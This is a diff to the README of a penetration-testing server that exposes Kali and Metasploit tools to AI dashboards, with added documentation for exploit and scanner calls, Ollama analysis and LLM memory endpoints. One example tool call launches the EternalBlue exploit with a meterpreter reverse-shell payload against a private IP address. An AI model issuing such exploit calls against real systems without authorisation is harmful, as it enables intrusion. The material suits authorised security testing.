@@ -604,6 +604,88 @@ Basic network scanning using nmap with safety constraints.
 }
 ```
 
+### metasploit.exploit
+
+Metasploit exploit module execution with comprehensive safety controls.
+
+**Schema**: `/schemas/tools/metasploit_exploit.json`
+
+**Arguments**:
+- `module` (required): Metasploit exploit module path (e.g., "exploit/windows/smb/ms17_010_eternalblue")
+- `target` (required): Target IP address or hostname
+- `payload` (optional): Payload to use (default: "generic/shell_reverse_tcp")
+- `lhost` (optional): Local host for reverse connections (default: "127.0.0.1")
+- `lport` (optional): Local port for reverse connections (default: 4444)
+- `rport` (optional): Remote port on target (default: 445)
+- `check_only` (recommended): Only check vulnerability, don't exploit (default: true)
+- `safe_mode` (recommended): Enable additional safety checks (default: true)
+- `timeout` (optional): Execution timeout in seconds (default: 180)
+
+**Safe Example (Vulnerability Check)**:
+```json
+{
+  "name": "metasploit.exploit",
+  "arguments": {
+    "module": "exploit/windows/smb/ms17_010_eternalblue",
+    "target": "192.168.1.100",
+    "check_only": true,
+    "safe_mode": true
+  }
+}
+```
+
+**⚠️ Advanced Example (Requires `allow_destructive: true`)**:
+```json
+{
+  "name": "metasploit.exploit",
+  "arguments": {
+    "module": "exploit/windows/smb/ms17_010_eternalblue",
+    "target": "192.168.1.100",
+    "payload": "windows/meterpreter/reverse_tcp",
+    "lhost": "192.168.1.50",
+    "lport": 4444,
+    "check_only": false,
+    "safe_mode": false
+  }
+}
+```
+
+### metasploit.auxiliary
+
+Metasploit auxiliary modules for scanning, enumeration, and reconnaissance.
+
+**Schema**: `/schemas/tools/metasploit_auxiliary.json`
+
+**Arguments**:
+- `module` (required): Auxiliary module path (e.g., "auxiliary/scanner/smb/smb_version")
+- `target` (required): Target IP address, hostname, or CIDR range
+- `rport` (optional): Remote port on target system
+- `threads` (optional): Number of concurrent threads (default: 10)
+- `timeout` (optional): Execution timeout in seconds (default: 300)
+- `options` (optional): Additional module-specific options
+
+**Example**:
+```json
+{
+  "name": "metasploit.auxiliary",
+  "arguments": {
+    "module": "auxiliary/scanner/smb/smb_version",
+    "target": "192.168.1.0/24",
+    "threads": 20,
+    "options": {
+      "ShowProgress": "true"
+    }
+  }
+}
+```
+
+**Common Safe Auxiliary Modules**:
+- `auxiliary/scanner/smb/smb_version` - SMB version detection
+- `auxiliary/scanner/ssh/ssh_version` - SSH version banner
+- `auxiliary/scanner/http/http_version` - HTTP server detection
+- `auxiliary/scanner/discovery/arp_sweep` - ARP-based host discovery
+- `auxiliary/scanner/portscan/tcp` - TCP port scanning
+
 ## File Structure
 
 ```
@@ -619,7 +701,13 @@ Basic network scanning using nmap with safety constraints.
 │   ├── util.py                # Utilities & schema validation
 │   └── schemas/               # Tool schemas
 │       └── tools/
-│           └── net_scan_basic.json
+│           ├── net_scan_basic.json
+│           ├── web_nikto.json
+│           ├── web_dirb.json
+│           ├── ssl_sslyze.json
+│           ├── net_masscan.json
+│           ├── metasploit_exploit.json
+│           └── metasploit_auxiliary.json
 ├── requirements.txt           # Python dependencies
 └── install.sh                # Installation script
 
@@ -702,6 +790,333 @@ curl -s -H "Authorization: Bearer ${API_KEY}" \
   "http://${SERVER_IP}:5000/memory/stats" | jq
 ```
 
+## 🤖 AI-Powered Analysis
+
+The MCP Kali Server includes intelligent analysis capabilities powered by Ollama AI models. This feature provides automated insights, recommendations, and executive summaries of your security testing activities.
+
+### Setup AI Analysis
+
+1. **Install Ollama** on your system:
+```bash
+# Linux/WSL
+curl -fsSL https://ollama.ai/install.sh | sh
+
+# Start Ollama service
+ollama serve
+```
+
+2. **Download a model** (recommended: llama2 or codellama):
+```bash
+ollama pull llama2
+```
+
+3. **Configure environment variables** (optional):
+```bash
+export OLLAMA_URL="http://localhost:11434"
+export OLLAMA_MODEL="llama2"
+```
+
+### AI Analysis Features
+
+#### 🔍 Job Analysis
+Analyzes completed tool executions and provides structured insights:
+
+```bash
+# Analyze a completed job
+curl -X POST -H "Authorization: Bearer ${API_KEY}" \
+  "http://${SERVER_IP}:5000/tools/jobs/${JOB_ID}/analyze"
+```
+
+**Response includes**:
+- **Summary**: High-level overview of what was discovered
+- **Findings**: Detailed security findings and vulnerabilities  
+- **Severity**: Risk assessment (Critical/High/Medium/Low/Info)
+- **Recommendations**: Suggested next steps for testing
+- **Context**: Security posture implications
+
+#### 🎯 Smart Tool Suggestions
+Get AI recommendations for next tools to run based on current findings:
+
+```bash
+# Get tool suggestions based on scan results  
+curl -H "Authorization: Bearer ${API_KEY}" \
+  "http://${SERVER_IP}:5000/tools/jobs/${JOB_ID}/suggestions"
+```
+
+**Example response**:
+```json
+{
+  "suggestions": [
+    {
+      "tool": "nikto",
+      "reason": "Web server detected on port 80, recommend vulnerability scanning",
+      "priority": "High"
+    },
+    {
+      "tool": "gobuster",
+      "reason": "Directory enumeration to discover hidden web content",
+      "priority": "Medium"
+    }
+  ]
+}
+```
+
+#### 📋 Executive Summaries
+Generate comprehensive summaries for multiple completed jobs:
+
+```bash
+# Generate executive summary for all jobs
+curl -X POST -H "Authorization: Bearer ${API_KEY}" \
+  -H "Content-Type: application/json" \
+  "http://${SERVER_IP}:5000/tools/analysis/executive-summary"
+
+# Generate summary for specific jobs
+curl -X POST -H "Authorization: Bearer ${API_KEY}" \
+  -H "Content-Type: application/json" \
+  -d '{"job_ids": ["job-123", "job-456", "job-789"]}' \
+  "http://${SERVER_IP}:5000/tools/analysis/executive-summary"
+```
+
+**Executive Summary includes**:
+- **Overview**: High-level summary of testing activities
+- **Critical Findings**: Most important security issues discovered
+- **Risk Assessment**: Overall security posture evaluation
+- **Business Impact**: Potential organizational impact
+- **Recommendations**: Priority remediation steps
+
+### AI Configuration
+
+The AI analysis system can be customized through environment variables:
+
+```bash
+# Ollama server URL (default: http://localhost:11434)
+export OLLAMA_URL="http://your-ollama-server:11434"
+
+# AI model to use (default: llama2)
+export OLLAMA_MODEL="codellama"  # or "mistral", "neural-chat", etc.
+
+# Analysis timeout (optional)
+export AI_ANALYSIS_TIMEOUT="120"
+```
+
+### Supported Models
+
+The system works with various Ollama models:
+- **llama2**: General-purpose analysis (recommended)
+- **codellama**: Enhanced code and technical analysis
+- **mistral**: Fast and efficient analysis
+- **neural-chat**: Conversational analysis style
+- **Custom models**: Any Ollama-compatible model
+
+### Example Workflow
+
+1. **Run a network scan**:
+```bash
+JOB_ID=$(curl -X POST -H "Authorization: Bearer ${API_KEY}" \
+  -H "Content-Type: application/json" \
+  -d '{"name":"nmap.scan","arguments":{"target":"192.168.1.100"}}' \
+  "http://${SERVER_IP}:5000/tools/call" | jq -r '.job_id')
+```
+
+2. **Wait for completion and analyze**:
+```bash
+# Check job status
+curl -H "Authorization: Bearer ${API_KEY}" \
+  "http://${SERVER_IP}:5000/tools/jobs/${JOB_ID}/status"
+
+# Analyze results with AI
+curl -X POST -H "Authorization: Bearer ${API_KEY}" \
+  "http://${SERVER_IP}:5000/tools/jobs/${JOB_ID}/analyze" | jq
+```
+
+3. **Get next tool suggestions**:
+```bash
+curl -H "Authorization: Bearer ${API_KEY}" \
+  "http://${SERVER_IP}:5000/tools/jobs/${JOB_ID}/suggestions" | jq
+```
+
+4. **Generate executive summary**:
+```bash
+curl -X POST -H "Authorization: Bearer ${API_KEY}" \
+  "http://${SERVER_IP}:5000/tools/analysis/executive-summary" | jq
+```
+
+## 🧠 LLM Configuration & Knowledge Management
+
+The MCP Kali Server includes a comprehensive LLM configuration system that allows dashboards and AI services to store and retrieve:
+- **System prompts and guardrails** for AI assistants
+- **Knowledge documents and searchable chunks** for context
+- **Conversation memory** per thread
+- **Live server context** for dynamic responses
+
+### LLM Configuration API
+
+#### Get/Update LLM Configuration
+```bash
+# Get current LLM configuration
+curl -H "Authorization: Bearer ${API_KEY}" \
+  "http://${SERVER_IP}:5000/llm/config"
+
+# Update configuration with optimistic concurrency
+curl -X PUT -H "Authorization: Bearer ${API_KEY}" \
+  -H "Content-Type: application/json" \
+  -H "If-Match: c4f1c5f5" \
+  -d '{
+    "system_prompt": "You are a security testing assistant for Kali-Lab-01...",
+    "guardrails": {
+      "disallowed": ["secrets", "credentials"],
+      "style": "concise",
+      "max_tokens_hint": 200
+    },
+    "runtime_hints": {
+      "preferred_model": "phi3:mini",
+      "num_ctx": 768,
+      "temperature": 0.2
+    },
+    "tools_allowed": ["nmap.scan", "nikto.scan"]
+  }' \
+  "http://${SERVER_IP}:5000/llm/config"
+```
+
+#### Knowledge Management
+```bash
+# Create knowledge document
+DOC_ID=$(curl -X POST -H "Authorization: Bearer ${API_KEY}" \
+  -H "Content-Type: application/json" \
+  -d '{"title": "SSH Security Guide", "source": "manual:ssh", "tags": ["ssh", "security"]}' \
+  "http://${SERVER_IP}:5000/llm/knowledge/docs" | jq -r '.doc_id')
+
+# Add text chunks
+curl -X POST -H "Authorization: Bearer ${API_KEY}" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "chunks": [
+      "SSH keys provide better security than passwords",
+      "Use ssh-keygen -t ed25519 to generate modern keys",
+      "Disable password authentication in /etc/ssh/sshd_config"
+    ]
+  }' \
+  "http://${SERVER_IP}:5000/llm/knowledge/docs/${DOC_ID}/chunks"
+
+# Search knowledge base
+curl -H "Authorization: Bearer ${API_KEY}" \
+  "http://${SERVER_IP}:5000/llm/knowledge/search?q=ssh%20keys&top_k=3"
+```
+
+#### Conversation Memory
+```bash
+# Append conversation turn
+curl -X POST -H "Authorization: Bearer ${API_KEY}" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "thread_id": "chat-session-123",
+    "role": "user",
+    "content": "How do I scan for SSH vulnerabilities?",
+    "meta": {"ip": "192.168.1.100"}
+  }' \
+  "http://${SERVER_IP}:5000/memory/append"
+
+# Retrieve conversation with context
+curl -H "Authorization: Bearer ${API_KEY}" \
+  "http://${SERVER_IP}:5000/memory/retrieve?thread_id=chat-session-123&q=ssh%20scanning&limit=10"
+
+# Summarize conversation
+curl -X POST -H "Authorization: Bearer ${API_KEY}" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "thread_id": "chat-session-123",
+    "summary": "User asked about SSH vulnerability scanning. Discussed nmap scripts and recommended security hardening."
+  }' \
+  "http://${SERVER_IP}:5000/memory/summarize"
+```
+
+#### Live Context
+```bash
+# Get dynamic server context
+curl -H "Authorization: Bearer ${API_KEY}" \
+  "http://${SERVER_IP}:5000/llm/context"
+```
+
+**Response Example**:
+```json
+{
+  "server_id": "kali-lab-01",
+  "uptime": "3 days, 4:11",
+  "alerts": [],
+  "services": [
+    {"name": "ssh", "state": "active"},
+    {"name": "postgres", "state": "inactive"}
+  ],
+  "disk_usage": "75.5% (100 GB free)",
+  "last_scan": "2025-10-05T10:30:00Z"
+}
+```
+
+### JWT Authentication for Dashboards
+
+```bash
+# Get JWT token using API key
+JWT_TOKEN=$(curl -X POST -H "Content-Type: application/json" \
+  -d '{"api_key": "'${API_KEY}'"}' \
+  "http://${SERVER_IP}:5000/auth/token" | jq -r '.access_token')
+
+# Use JWT token for subsequent requests
+curl -H "Authorization: Bearer ${JWT_TOKEN}" \
+  "http://${SERVER_IP}:5000/llm/config"
+```
+
+### Integration with AI Services
+
+The LLM configuration system is designed to support dashboard applications and AI services by providing:
+
+1. **Authoritative Configuration**: Server stores the definitive system prompt and guardrails
+2. **Contextual Knowledge**: Searchable knowledge base with BM25 full-text search
+3. **Conversation Continuity**: Thread-based memory with semantic search
+4. **Dynamic Context**: Live server status for context-aware responses
+5. **Security Controls**: JWT authentication and optimistic concurrency control
+
+### Database Schema
+
+The system uses SQLite with FTS5 for efficient text search:
+
+```sql
+-- LLM Configuration
+CREATE TABLE llm_config (
+    server_id TEXT PRIMARY KEY,
+    system_prompt TEXT NOT NULL,
+    guardrails TEXT NOT NULL,     -- JSON
+    runtime_hints TEXT NOT NULL, -- JSON  
+    tools_allowed TEXT NOT NULL, -- JSON array
+    etag TEXT NOT NULL
+);
+
+-- Knowledge Documents & Chunks with FTS5 search
+CREATE TABLE knowledge_docs (
+    doc_id TEXT PRIMARY KEY,
+    server_id TEXT NOT NULL,
+    title TEXT NOT NULL,
+    source TEXT,
+    tags TEXT -- JSON array
+);
+
+CREATE VIRTUAL TABLE knowledge_fts USING fts5(
+    chunk_id UNINDEXED,
+    doc_id UNINDEXED, 
+    source UNINDEXED,
+    text
+);
+
+-- Conversation Memory
+CREATE TABLE conversation_memory (
+    id INTEGER PRIMARY KEY,
+    server_id TEXT NOT NULL,
+    thread_id TEXT NOT NULL,
+    role TEXT CHECK (role IN ('user', 'assistant', 'system')),
+    content TEXT NOT NULL,
+    meta TEXT -- JSON metadata
+);
+```
+
 ## DARK MATER MCP Client
 
 This server is designed to work seamlessly with the **DARK MATER MCP Client** - a sophisticated dashboard for managing multiple MCP servers and coordinating security testing operations.
@@ -713,6 +1128,7 @@ This server is designed to work seamlessly with the **DARK MATER MCP Client** - 
 - 🛠️ **Tool Orchestration**: Execute security tools across multiple servers
 - 📁 **Artifact Management**: Centralized collection and analysis of results
 - 🧠 **Knowledge Base**: Shared memory and findings across servers
+- 🤖 **LLM Integration**: AI-powered configuration and conversation management
 
 ### Connection Setup
 1. **Install and start** this MCP server using the CLI tool
